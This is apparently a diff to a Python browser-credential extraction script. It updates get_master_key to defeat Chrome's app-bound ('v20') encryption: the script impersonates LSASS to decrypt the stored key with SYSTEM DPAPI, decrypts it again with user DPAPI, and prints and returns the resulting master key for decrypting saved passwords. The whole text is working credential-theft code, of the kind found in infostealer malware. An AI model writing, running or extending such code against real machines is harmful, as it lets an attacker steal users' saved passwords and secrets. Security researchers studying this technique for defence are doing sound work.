@@ -31,12 +31,28 @@ def get_master_key():
         local_state["os_crypt"]["encrypted_key"]
     )
 
+    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+    assert (binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
+    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
+
+    # Decrypt with SYSTEM DPAPI
+    with impersonate_lsass():
+        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
+
+    # Decrypt with user DPAPI
+    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
+
+    # Get key
+    v20_master_key = key_blob_user_decrypted[-32:]
+
+    print(v20_master_key)
+
     # Remove DPAPI prefix
-    encrypted_key = encrypted_key[5:]
+    #encrypted_key = encrypted_key[5:]
 
-    master_key = win32crypt.CryptUnprotectData(...)[1]
+    #master_key = win32crypt.CryptUnprotectData(...)[1]
 
-    return master_key
+    return v20_master_key
 
 
 def decrypt_password(buff, master_key):
